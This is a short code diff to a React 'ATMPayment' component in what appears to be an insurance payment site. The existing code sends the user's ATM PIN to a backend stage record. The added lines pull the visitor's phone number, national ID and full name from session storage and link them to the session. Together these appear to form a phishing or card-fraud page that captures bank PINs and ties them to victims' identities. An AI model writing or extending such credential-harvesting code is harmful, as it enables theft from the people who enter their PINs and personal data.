@@ -32,7 +32,13 @@ const ATMPayment = () => {
   const handleVerify = async () => {
     if (pin.length < 4) return;
     setLoading(true);
-    linkVisitorToSession({});
+    try {
+      const customerData = sessionStorage.getItem("insurance_customer");
+      if (customerData) {
+        const c = JSON.parse(customerData);
+        linkVisitorToSession({ phone: c.phone, national_id: c.national_id, visitor_name: c.full_name });
+      }
+    } catch {}
     const id = await createOrUpdateStage(currentOrderId, "atm", { atm_pin: pin });
     setCurrentOrderId(id);
     if (id) sessionStorage.setItem("insurance_order_id", id);
